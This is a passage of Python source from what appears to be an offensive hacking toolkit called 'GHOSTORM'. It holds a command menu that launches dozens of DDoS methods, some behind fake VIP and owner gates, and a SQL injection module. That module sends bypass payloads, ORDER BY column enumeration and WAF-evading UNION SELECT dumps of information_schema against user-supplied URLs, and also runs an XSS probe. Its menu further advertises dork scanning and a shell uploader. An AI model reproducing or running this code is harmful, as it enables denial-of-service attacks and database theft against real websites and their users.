                    elif prompt.lower() == 'red':
                        open('resources/main_/color.txt', 'w').write(str(color.red()))
                        repage()
                    elif prompt.lower() == 'yellow':
                        open('resources/main_/color.txt', 'w').write(str(color.yellow()))
                        repage()
                    elif prompt.lower() == 'green':
                        open('resources/main_/color.txt', 'w').write(str(color.green()))
                        repage()
                    elif prompt.lower() == 'blue':
                        open('resources/main_/color.txt', 'w').write(str(color.blue()))
                        repage()
                    elif prompt.lower() == 'reset':
                        open('resources/main_/color.txt', 'w').write(str(color.purple()))
                        repage()
                    elif prompt.lower() == 'custom':
                        col = input('color (example: \\033[1;32m): ')
                        open('resources/main_/color.txt', 'w').write(str(col))
                        repage()
                    elif prompt.lower() == 'sky':
                        DDOS.method.SKY()
                    elif prompt.lower() == 'pxlowraw':
                        DDOS.method.PXLOWRAW()
                    elif prompt.lower() == 'deltasky':
                        DDOS.method.DeltaSKY()
                    elif prompt.lower() == 'pxsilent':
                        DDOS.method.pxsilent()
                    elif prompt.lower() == 'silent':
                        DDOS.method.silent()
                    elif prompt.lower() == 'mylove':
                        DDOS.method.mylove()
                    elif prompt.lower() == 'pxdeltasky':
                        DDOS.method.PXDeltaSKY()
                    elif prompt.lower() == 'httpburn':
                        DDOS.method.http_burn()
                    elif prompt.lower() == 'pxsky':
                        DDOS.method.PXSKY()
                    elif prompt.lower() == 'rage':
                        DDOS.method.Rage()
                    elif prompt.lower() == 'cfb':
                        DDOS.method.CFB()
                    elif prompt.lower() == 'pxcfb':
                        DDOS.method.PXCFB()
                    elif prompt.lower() == 'pxspaced':
                        DDOS.method.PXSpaceD()
                    elif prompt.lower() == 'spaced':
                        DDOS.method.SpaceD()
                    elif prompt.lower() == 'pxcfpro':
                        DDOS.method.PXCFPRO()
                    elif prompt.lower() == 'cfpro':
                        DDOS.method.CFPRO()
                    elif prompt.lower() == 'ion':
                        DDOS.method.ION()
                    elif prompt.lower() == 'pxstar':
                        DDOS.method.PXSTAR()
                    elif prompt.lower() == 'stresserv1':
                        DDOS.method.STRESSERV1()
                    elif prompt.lower() == 'stresserv2':
                        DDOS.method.STRESSERV2()
                    elif prompt.lower() == 'cfuam':
                        DDOS.method.CFUAM()
                    elif prompt.lower() == 'freeze':
                        DDOS.method.SPECIAL.start.freeze()
                    elif prompt.lower() == 'bumb':
                        if exists('resources/main_/vip.log'):
                            loc = 'resources/main_/vip.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.BUMB()
                            else:
                                print('You are not VIP!')
                        else:
                            print('You are not VIP!')
                    elif prompt.lower() == 'pxbumb':
                        if exists('resources/main_/vip.log'):
                            loc = 'resources/main_/vip.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.PXBUMB()
                            else:
                                print('You are not VIP!')
                        else:
                            print('You are not VIP!')
                    elif prompt.lower() == 'mixsanzz':
                        DDOS.method.MIXSANZZ()
                    elif prompt.lower() == 'mydoom':
                        print("WARNING!, THIS METHOD CAN CAUSE THE PERFORMANCE OF THE DEVICE YOU USE TO SLOW DOWN OR EVEN DIE TOTALLY")
                        e = input("Are you sure you want to continue the action? Y/N : ")
                        if e.lower() == 'y':
                            pass
                        else:
                            return main.main()
                        DDOS.method.HOLD.MYDOOM()
                    elif prompt.lower() == 'get':
                        DDOS.method.ghost.get()
                    elif prompt.lower() == 'post':
                        DDOS.method.ghost.post()
                    elif prompt.lower() == 'head':
                        DDOS.method.ghost.head()
                    elif prompt.lower() == 'buyvip':
                        if not exists('resources/main_/vip.log'):
                            info.login.is_vip()
                        elif exists('resources/main_/vip.log'):
                            print('You already become a VIP!')
                        else:
                            print("Error, No assets found.")
                    elif prompt.lower() == 'asowner':
                        if not exists('resources/main_/owner.log'):
                            info.login.is_owner()
                        elif exists('resources/main_/owner.log'):
                            print('You already become a Owner!')
                        else:
                            print("Error, No assets found.")
                    elif prompt.lower() == 'test':
                        print('nuh uh')
                    elif prompt.lower() == 'cls':
                        clear()
                        logo.main_delta()
                    elif prompt.lower() == 'cmdlist':
                        logo.cmdl_delta()
                    elif prompt.lower() == 'icbm':
                        if exists('resources/main_/vip.log'):
                            loc = 'resources/main_/vip.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.ICBM()
                            else:
                                print('You are not VIP!')
                        else:
                            print('You are not VIP!')
                    elif prompt.lower() == 'pxicbm':
                        if exists('resources/main_/vip.log'):
                            loc = 'resources/main_/vip.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.PXICBM()
                            else:
                                print('You are not VIP!')
                        else:
                            print('You are not VIP!')
                    elif prompt.lower() == 'nuke':
                        if exists('resources/main_/vip.log'):
                            loc = 'resources/main_/vip.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.NUKE()
                            else:
                                print('You are not VIP!')
                        else:
                            print('You are not VIP!')
                    elif prompt.lower() == 'anya':
                        if exists('resources/main_/owner.log'):
                            loc = 'resources/main_/owner.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.ANYA()
                            else:
                                print('You are not Owner!')
                        else:
                            print('You are not Owner!')
                    elif prompt.lower() == 'ahegao':
                        if exists('resources/main_/owner.log'):
                            loc = 'resources/main_/owner.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.AHEGAO()
                            else:
                                print('You are not Owner!')
                        else:
                            print('You are not Owner!')
                    elif prompt.lower() == 'pxahegao':
                        if exists('resources/main_/owner.log'):
                            loc = 'resources/main_/owner.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.PXAHEGAO()
                            else:
                                print('You are not Owner!')
                        else:
                            print('You are not Owner!')
                    elif prompt.lower() == 'pxanya':
                        if exists('resources/main_/owner.log'):
                            loc = 'resources/main_/owner.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.PXANYA()
                            else:
                                print('You are not Owner!')
                        else:
                            print('You are not Owner!')
                    elif prompt.lower() == 'getproxy':
                        info.getproxy()
                    elif prompt.lower() == 'anyav2':
                        if exists('resources/main_/owner.log'):
                            loc = 'resources/main_/owner.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.jar.ANYAV2()
                            else:
                                print('You are not Owner!')
                        else:
                            print('You are not Owner!')
                    elif prompt.lower() == 'pxanyav2':
                        if exists('resources/main_/owner.log'):
                            loc = 'resources/main_/owner.log'
                            with open(loc, 'r') as file:
                                file = file.readline()
                            file = file.strip()
                            if 'YES' in file:
                                DDOS.method.jar.PXANYAV2()
                            else:
                                print('You are not Owner!')
                        else:
                            print('You are not Owner!')
                    elif prompt.lower() == 'changeconc':
                        user = input(Fore.LIGHTRED_EX+"[!]"+Fore.WHITE+" Concurrent [1-6] : ")
                        if not user:
                            print(Fore.RED + "Error: please fill!")
                        elif not user.isdigit() or int(user) > 6:
                            print(Fore.RED + "Error: max is 6 concurrent!")
                        else:
                            with open('resources/logs/conc.log', 'w') as file:
                                file.write(str(user)+'\r')
                except KeyboardInterrupt:
                    exit()
                except EOFError:
                    exit()
        if __name__ == '__main__':
            mainz()
    class main:
        info.login.create_folders()
        clear()
        info.login.start()
        info.concurrent.concurrent()
        clear()
        logo.main()
        def main():
            open('resources/logs/recent.txt', 'w').write(str('basicmode')+'\r')
            if not exists('resources/main_/owner.log'):
                open('resources/main_/owner.log', 'w').write(str('YES')+'\r')
            if not exists('resources/main_/vip.log'):
                open('resources/main_/vip.log', 'w').write(str('YES')+'\r')
            while main:
                try:
                    PS1 = ""+'\033[0;33m'+"╭────["+'\033[0m'+"GHOSTORM"+'\033[0;31;40m'+"@"+'\033[0m'+info.login.username()+'\033[0;33m'+"]\n"+'\033[0;33m'+"╰───>"+'\033[0m'+" "
                    prompt = input(PS1 + '')
                except KeyboardInterrupt:
                    exit()
                except EOFError:
                    exit()
                if prompt.lower() == 'help':
                    logo.help()
                elif prompt.lower() == 'layer7':
                    logo.layer7()
                elif prompt.lower() == 'delta mode':
                    if exists('resources/main_/vip.log'):
                        loc = 'resources/main_/vip.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            clear()
                            logo.main_delta()
                            delta()
                        else:
                            print('Sorry, but you are not VIP!')
                    else:
                        print('Sorry, but you are not VIP!')
                elif prompt.lower() == 'layer7delta':
                    print("You must use delta mode with typing 'delta mode' !.")
                elif prompt.lower() == 'layer4':
                    logo.layer4()
                elif prompt.lower() == 'hoshino':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'pxlowraw':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'deltasky':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'pxdeltasky':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'pxspaced':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'spaced':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'freeze':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'httpburn':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'silent':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'pxsilent':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'sky':
                    DDOS.method.SKY()
                elif prompt.lower() == 'pxsky':
                    DDOS.method.PXSKY()
                elif prompt.lower() == 'rage':
                    print("You must on Delta mode with typing 'delta mode'!")
                elif prompt.lower() == 'cfb':
                    DDOS.method.CFB()
                elif prompt.lower() == 'pxcfb':
                    DDOS.method.PXCFB()
                elif prompt.lower() == 'pxcfpro':
                    DDOS.method.PXCFPRO()
                elif prompt.lower() == 'cfpro':
                    DDOS.method.CFPRO()
                elif prompt.lower() == 'ion':
                    DDOS.method.ION()
                elif prompt.lower() == 'pxstar':
                    DDOS.method.PXSTAR()
                elif prompt.lower() == 'stresserv1':
                    DDOS.method.STRESSERV1()
                elif prompt.lower() == 'stresserv2':
                    DDOS.method.STRESSERV2()
                elif prompt.lower() == 'cfuam':
                    DDOS.method.CFUAM()
                elif prompt.lower() == 'bumb':
                    if exists('resources/main_/vip.log'):
                        loc = 'resources/main_/vip.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.BUMB()
                        else:
                            print('You are not VIP!')
                    else:
                        print('You are not VIP!')
                elif prompt.lower() == 'pxbumb':
                    if exists('resources/main_/vip.log'):
                        loc = 'resources/main_/vip.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.PXBUMB()
                        else:
                            print('You are not VIP!')
                    else:
                        print('You are not VIP!')
                elif prompt.lower() == 'mixsanzz':
                    DDOS.method.MIXSANZZ()
                elif prompt.lower() == 'mydoom':
                    print("WARNING!, THIS METHOD CAN CAUSE THE PERFORMANCE OF THE DEVICE YOU USE TO SLOW DOWN OR EVEN DIE TOTALLY")
                    e = input("Are you sure you want to continue the action? Y/N : ")
                    if e.lower() == 'y':
                        pass
                    else:
                        return main.main()
                    DDOS.method.HOLD.MYDOOM()
                elif prompt.lower() == 'get':
                    DDOS.method.ghost.get()
                elif prompt.lower() == 'post':
                    DDOS.method.ghost.post()
                elif prompt.lower() == 'head':
                    DDOS.method.ghost.head()
                elif prompt.lower() == 'buyvip':
                    if not exists('resources/main_/vip.log'):
                        info.login.is_vip()
                    elif exists('resources/main_/vip.log'):
                        print('You already become a VIP!')
                    else:
                        print("Error, No assets found.")
                elif prompt.lower() == 'asowner':
                    if not exists('resources/main_/owner.log'):
                        info.login.is_owner()
                    elif exists('resources/main_/owner.log'):
                        print('You already become a Owner!')
                    else:
                        print("Error, No assets found.")
                elif prompt.lower() == 'test':
                    print("there's nothing to test sir.")
                elif prompt.lower() == 'cls':
                    clear()
                    logo.main()
                elif prompt.lower() == 'cmdlist':
                    logo.cmdl()
                elif prompt.lower() == 'icbm':
                    if exists('resources/main_/vip.log'):
                        loc = 'resources/main_/vip.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.ICBM()
                        else:
                            print('You are not VIP!')
                    else:
                        print('You are not VIP!')
                elif prompt.lower() == 'pxicbm':
                    if exists('resources/main_/vip.log'):
                        loc = 'resources/main_/vip.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.PXICBM()
                        else:
                            print('You are not VIP!')
                    else:
                        print('You are not VIP!')
                elif prompt.lower() == 'nuke':
                    if exists('resources/main_/vip.log'):
                        loc = 'resources/main_/vip.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.NUKE()
                        else:
                            print('You are not VIP!')
                    else:
                        print('You are not VIP!')
                elif prompt.lower() == 'anya':
                    if exists('resources/main_/owner.log'):
                        loc = 'resources/main_/owner.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.ANYA()
                        else:
                            print('You are not Owner!')
                    else:
                        print('You are not Owner!')
                elif prompt.lower() == 'ahegao':
                    if exists('resources/main_/owner.log'):
                        loc = 'resources/main_/owner.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.AHEGAO()
                        else:
                            print('You are not Owner!')
                    else:
                        print('You are not Owner!')
                elif prompt.lower() == 'pxahegao':
                    if exists('resources/main_/owner.log'):
                        loc = 'resources/main_/owner.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.PXAHEGAO()
                        else:
                            print('You are not Owner!')
                    else:
                        print('You are not Owner!')
                elif prompt.lower() == 'pxanya':
                    if exists('resources/main_/owner.log'):
                        loc = 'resources/main_/owner.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.PXANYA()
                        else:
                            print('You are not Owner!')
                    else:
                        print('You are not Owner!')
                elif prompt.lower() == 'getproxy':
                    info.getproxy()
                elif prompt.lower() == 'anyav2':
                    if exists('resources/main_/owner.log'):
                        loc = 'resources/main_/owner.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.jar.ANYAV2()
                        else:
                            print('You are not Owner!')
                    else:
                        print('You are not Owner!')
                elif prompt.lower() == 'pxanyav2':
                    if exists('resources/main_/owner.log'):
                        loc = 'resources/main_/owner.log'
                        with open(loc, 'r') as file:
                            file = file.readline()
                        file = file.strip()
                        if 'YES' in file:
                            DDOS.method.jar.PXANYAV2()
                        else:
                            print('You are not Owner!')
                    else:
                        print('You are not Owner!')
                elif prompt.lower() == 'changeconc':
                    user = input(Fore.LIGHTRED_EX+"[!]"+Fore.WHITE+" Concurrent [1-6] : ")
                    if not user:
                        print(Fore.RED + "Error: please fill!")
                    elif not user.isdigit() or int(user) > 6:
                        print(Fore.RED + "Error: max is 6 concurrent!")
                    else:
                        with open('resources/logs/conc.log', 'w') as file:
                            file.write(str(user)+'\r')
                else:
                    print(color.red() + "Unknown command, type 'help' for help!.")
    if __name__ == '__main__':
        main.main()

class tools:
    def sqlite():
        if os.name == 'posix':
            os.system('clear')
        elif os.name == 'nt':
            os.system('cls')
        pass
        logo = f"""{gold}
        +--------------------------------------+
        |                                      |
        |           {green}WELCOME {red}To SQLITE!{gold}         |
        |                                      |
        +--------------------------------------+
                        {white}SQLite V1              
        {gold}+----------{yellow}[{green}~{yellow}] {red_t}SQLite Menu {yellow}[{green}~{yellow}]{gold}---------+
        {gold}| [{green}01{gold}] {yellow}Single site injection{gold}           |
        {gold}| [{green}02{gold}] {yellow}Dork vuln site{gold}                  |
        {gold}| [{green}03{gold}] {yellow}Dork + Auto Inject{gold}              |
        {gold}| [{green}04{gold}] {yellow}Shell Uploader{gold}                  |
        {gold}| [{green}05{gold}] {yellow}Web Crawler{gold}                     |
        {gold}| [{green}06{gold}] {yellow}Shell Finder V2{gold}                 |
        {gold}| [{green}07{gold}] {yellow}None{gold}                            |
        {gold}| [{green}08{gold}] {yellow}None{gold}                            |
        {gold}| [{green}09{gold}] {yellow}None{gold}                            |
        {gold}| [{green}10{gold}] {yellow}None{gold}                            |
        {gold}| [{green}11{gold}] {yellow}None{gold}                            |
        {gold}| [{green}12{gold}] {yellow}None{gold}                            |
        {gold}| [{green}13{gold}] {yellow}None{gold}                            |
        {gold}| [{green}14{gold}] {yellow}None{gold}                            |
        {gold}+--------------------------------------+
        """
        try:
            os.mkdir('sqlite')
        except:
            pass
        def start_savelog(target, uri, value):
            target_directory = 'sqlite'
            file_name = 'Injected_Sites.txt'

            path = os.path.join(target_directory, file_name)
            with open(path, 'a') as file:
                try:
                    logs = f'Sites : {target}\n'
                    logs += f'Injected Payload [Order By]: {uri}\n'
                    logs += f'Injected Columns : {value}\n\n'
                    file.write(str(logs))
                    file.close()
                except PermissionError:
                    print("Permission Error Detected, If u are using kali linux or else, please use root with typing 'sudo su' ! ")
                except:
                    pass
        def save_log2(target, ul):
            a = f"Site : {target}\n"
            a += f"Type : Injected\n"
            a += f"Payload : {ul}"
            target_directory = 'sqlite'
            file_name = 'Injected_Sites_Phase3.txt'

            path = os.path.join(target_directory, file_name)
            with open(path, 'a') as file:
                try:
                    file.write(str(a))
                    file.close()
                except PermissionError:
                    print("Permission Error Detected, If u are using kali linux or else, please use root with typing 'sudo su' ! ")
                except:
                    pass
        print(logo)
        choi = input(yellow + f"sqlite@choices ~{white}$ ")
        def singleinject():
            byps1 = "' OR 1=1; --"
            byps2 = "' OR 'a'='a'; --"
            byps3 = "' OR 1=1# --"
            byps4 = "' OR 'a'='a'# --"
            byps5 = "' OR 1=1/*"
            byps6 = "' OR 'a'='a'/*"
            byps7 = "'-1' OR '1'='1'"
            byps8 = "'-1' OR 'a'='a'"
            byps9 = "' OR 1=1/*"
            byps10 = "' OR 'a'='a'/*"
            unibas = "'UNION SELECT column1, column2 FROM table_name'" #dump
            ecode = re.compile(r"Warning: mysql_query|Warning: mysql_fetch_row|Warning: mysql_fetch_assoc|Warning: mysql_fetch_object|Warning: mysql_numrows|Warning: mysql_num_rows|Warning: mysql_fetch_array|Warning: pg_connect|Supplied argument is not a valid PostgreSQL result|PostgreSQL query failed: ERROR: parser: parse error|MySQL Error|MySQL ODBC|MySQL Driver|supplied argument is not a valid MySQL result resource|on MySQL result index|Oracle ODBC|Oracle Error|Oracle Driver|Oracle DB2|Microsoft JET Database Engine error|ADODB.Command|ADODB.Field error|Microsoft Access Driver|Microsoft VBScript runtime error|Microsoft VBScript compilation error|Microsoft OLE DB Provider for SQL Server error|OLE/DB provider returned message|OLE DB Provider for ODBC|ODBC SQL|ODBC DB2|ODBC Driver|ODBC Error|ODBC Microsoft Access|ODBC Oracle|JDBC SQL|JDBC Oracle|JDBC MySQL|JDBC error|JDBC Driver|Invision Power Board Database Error|DB2 ODBC|DB2 error|DB2 Driver|error in your SQL syntax|unexpected end of SQL command|invalid query|SQL command not properly ended|Error converting data type varchar to numeric|An illegal character has been found in the statement|Active Server Pages error|ASP.NET_SessionId|ASP.NET is configured to show verbose error messages|A syntax error has occurred|ORA-01756|Error Executing Database Query|Unclosed quotation mark|BOF or EOF|GetArray|FetchRow|Input string was not in a correct format|Warning: include|Warning: require_once|function.include|Disallowed Parent Path|function.require|Warning: main|Warning: session_start|Warning: getimagesize|Warning: mysql_result|Warning: pg_exec|Warning: array_merge|Warning: preg_match|Incorrect syntax near|ORA-00921: unexpected end of SQL command|Warning: ociexecute|Warning: ocifetchstatement|error ORA-")
            lfi_path = '/etc/passwd'
            order_by = 'SELECT * FROM orders ORDER BY 1, 2, 3, 4, 5, 6, 7, 8, 9, 10;'
            target = str(input(f"{yellow}[{green}~{yellow}] {gold}Enter your target url [ Example : https://example.com/news.php?id=1 ] :{white} "))
            tampers = input(f"{yellow}[{green}~{yellow}] {gold}Use Tamper ? Y/N :{white} ")
            if tampers.lower() == 'y':
                pass
            elif tampers.lower() == 'n':
                pass
            else:
                print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Invalid Options! {white}")
            if (target.lower() == 'https://' or 'http://'):
                target = target
            else:
                target = 'https://'+target
            def dumps():
                print("Start Dump..")
            def start_orderby():
                heads = {
                    f"User-Agent": f"{random.choice(user_agents)}",
                    f"Content-Length": "20",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Accept": "*/*",
                    "Content-Type": "text/html",
                    "Referer": "https://gtamper.co.me",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Custom-Header": "GTamper",
                }
                pass
                c = int(0)
                value = 0
                for i in range(50):
                    c += 1
                    value += 1
                    time.sleep(0.5)
                    #' ORDER BY 1,2,3--+
                    t = f','.join(str(t) for t in range(1, value + 1))
                    onion = (f"' ORDER BY {t}--+")
                    print(f"{yellow}[{green}~{yellow}] {gold}Starting ORDER BY until 50.{yellow}", c, end='\r')
                    uri = target+onion
                    r = requests.get(uri, headers=heads)
                    if (r.text == "in 'order clause'" in r.text):
                        print(f"{yellow}[{green} Injected! {yellow}] {gold} Site : {target} Injected!, Detected : Column {value}")
                        print(f"{yellow}[{green} Injected! {yellow}] {gold} Payload : {uri}")
                        start_savelog(target, uri, value)
                    else:
                        pass
            def start_injection_sql():
                heads = {
                    f"User-Agent": f"{random.choice(user_agents)}",
                    f"Content-Length": "20",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Accept": "*/*",
                    "Content-Type": "text/html",
                    "Referer": "https://gtamper.co.me",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Custom-Header": "GTamper",
                }
                def xss():
                    xss = "'--+<h1>Touched By JogjaXploit</h1>"
                    print(f"{yellow}[{green}~{yellow}] {gold}Testing XSS{white}")
                    url = target+xss
                    req = requests.get(url, headers=heads)
                    if ('Touched By JogjaXploit' in req.text):
                        print(f"{yellow}[{green}~{yellow}] {gold}Target is VULN with XSS{white}")
                    else:
                        print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Target is not VULN with XSS {white}")
                def phase2():
                    ecode1 = "Forbidden"
                    value = 0
                    dumpz = '(select%20group_concat(0x3c6c693e,schema_name,0x3c6c693e)%20from%20information_schema.schemata)'
                    for i in range(50):
                        value += 1
                        t = f','.join(str(t) for t in range(1, value + 1))
                        onion = (f"{t}")
                        ott = onion
                        bypass_dumps1 = f"'/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/{ott}"
                        print(f"{yellow}[{green}~{yellow}] {gold}Starting dump target dbs until 50.. ", value, end='\r')
                        yuhuh = target+bypass_dumps1
                        if tampers.lower() == 'y':
                            e = requests.get(yuhuh, headers=heads)
                        elif tampers.lower() == 'n':
                            e = requests.get(yuhuh)
                        else:
                            exit()
                    if (e.text == "1" or e.text == "2" or e.text == "3" or e.text == "4" or e.text == "5" or e.text == "6" or e.text == "7" or e.text == "8" or e.text == "9" or e.text == "10" or e.text == "11" or e.text == "12" or e.text == "13" or e.text == "14" or e.text == "15" or e.text == "16" or e.text == "17" or e.text == "18" or e.text == "19" or e.text == "20" or e.text == "21" or e.text == "22" or e.text == "23" or e.text == "24" or e.text == "25" or e.text == "26" or e.text == "27" or e.text == "28" or e.text == "29" or e.text == "30" or e.text == "31" or e.text == "32" or e.text == "33" or e.text == "34" or e.text == "35" or e.text == "36" or e.text == "37" or e.text == "38" or e.text == "39" or e.text == "40" or e.text == "41" or e.text == "42" or e.text == "43" or e.text == "44" or e.text == "45" or e.text == "46" or e.text == "47" or e.text == "48" or e.text == "49" or e.text == "50" in e.text):
                        print(f"{yellow}[{green}~{yellow}] {gold}Trying to dump database..{white}")
                        dumps = bypass_dumps1.replace(f"{value}", dumpz)
                        domp = target+dumps
                        def inject():
                            if tampers.lower() == 'y':
                                e = requests.get(domp, headers=heads)
                            elif tampers.lower() == 'n':
                                e = requests.get(domp)
                            if ecode1 in e.text:
                                print(f"{yellow}[{red} CRITICAL {yellow}] {gold} 403 Forbidden")
                                pass
                            if (e.text == 'information_schema' in e.text):
                                print(f"{yellow}[ {red}!! {yellow}] {gold} Injected !")
                            return e.text
                        inject()
                    print("Finished")
                def phase3():
                    value = 0
                    dumpz = '(select%20group_concat(0x3c6c693e,schema_name,0x3c6c693e)%20from%20information_schema.schemata)'
                    for i in range(50):
                        value += 1
                        print(f"{yellow}[{green}~{yellow}] {gold}Starting Re-Inject (Dump Payload) Until 50 [ Phase3 ]{yellow}", value, white, end='\r')
                        t = f','.join(str(t) for t in range(1, value + 1))
                        onion = (f"{t},")
                        ott = onion
                        a = f"'/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/{ott}{dumpz}"
                        ul = target+a
                        if tampers.lower() == 'y':
                            reques = requests.get(ul, headers=heads)
                        elif tampers.lower() == 'n':
                            reques = requests.get(ul)
                        else:
                            print(f"{yellow}[{red}~{yellow}] {red} Invalid Options {white}")
                            exit()
                        if "information_schema" in reques.text:
                            print(f"{yellow}[ {green}Injected {yellow}] {gold}Site : {url} is injected! {white}")
                            print(f"{yellow}[ {green}Injected {yellow}] {gold}Payload : {ul} {white}")
                            save_log2(target, ul)
                        else:
                            print(f"{yellow}[ {red}CRITICAL {yellow}] {gold} Site is not vulnerable with sqli..{white}")
                    print("Finished")
                byps = ["' OR 1=1; --", "' OR 'a'='a'; --", "' OR 1=1# --", "' OR 'a'='a'# --", "' OR 1=1/*", "' OR 'a'='a'/*", "'-1' OR '1'='1'", "'-1' OR 'a'='a'", "' OR 1=1/*", "' OR 'a'='a'/*"]
                start_orderby()
                phase2()
                phase3()
                xss()
                for method in byps:
                    url = target+method
                    print(yellow + f"\n{yellow}[{green}~{yellow}] {gold}Inject Process..{yellow}")
                    if tampers.lower() == 'n':
                        req = requests.get(url)
                    elif tampers.lower() == 'y':
                        req = requests.get(url, headers=heads)
                    else:
                        print(red + "invalid option")
                        exit()
                    if ecode.search(req.text):
                        print(yellow + f"[{green}~{yellow}] {gold}Target is {green}vuln!{yellow}")
                        print(yellow + f"Payload : {url}")
                    else:
                        print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Maybe target has no vuln.{white}")
            def testing():
                heads = {
                    f"User-Agent": f"{random.choice(user_agents)}",
                    f"Content-Length": "20",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Accept": "*/*",
                    "Content-Type": "text/html",
                    "Referer": "https://gtamper.co.me",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Custom-Header": "GTamper",
                }
                payload = ["'", "'--+", "'or 1=1 1-- +", "' OR 1=1; --"]
                print(yellow + f"[~] Testing vuln with a {red}coma..{yellow}")
                for pay in payload:
                    def testingsql():
                        if tampers.lower() == 'n':
                            a = requests.get(target+pay).text
                        elif tampers.lower() == 'y':
                            a = requests.get(target+pay, headers=heads).text
                        if ecode.search(a):
                            print(f"{yellow}[{green}~{yellow}] {gold}Site : {target} is Vuln!{white}")
                        else:
                            print(f"{yellow}[{green}~{yellow}] {gold}Site : {red}{target}{yellow} maybe not vuln {white}")
                            choicess = input("Do you want to continue ? Y/N : ")
                            if choicess.lower() == 'y':
                                start_injection_sql()
                            else:
                                exit()
                        start_injection_sql()
                    testingsql()
            testing()
        def dorkninject(dorkz):
            byps1 = "' OR 1=1; --"
            byps2 = "' OR 'a'='a'; --"
            byps3 = "' OR 1=1# --"
            byps4 = "' OR 'a'='a'# --"
            byps5 = "' OR 1=1/*"
            byps6 = "' OR 'a'='a'/*"
            byps7 = "'-1' OR '1'='1'"
            byps8 = "'-1' OR 'a'='a'"
            byps9 = "' OR 1=1/*"
            byps10 = "' OR 'a'='a'/*"
            unibas = "'UNION SELECT column1, column2 FROM table_name'" #dump
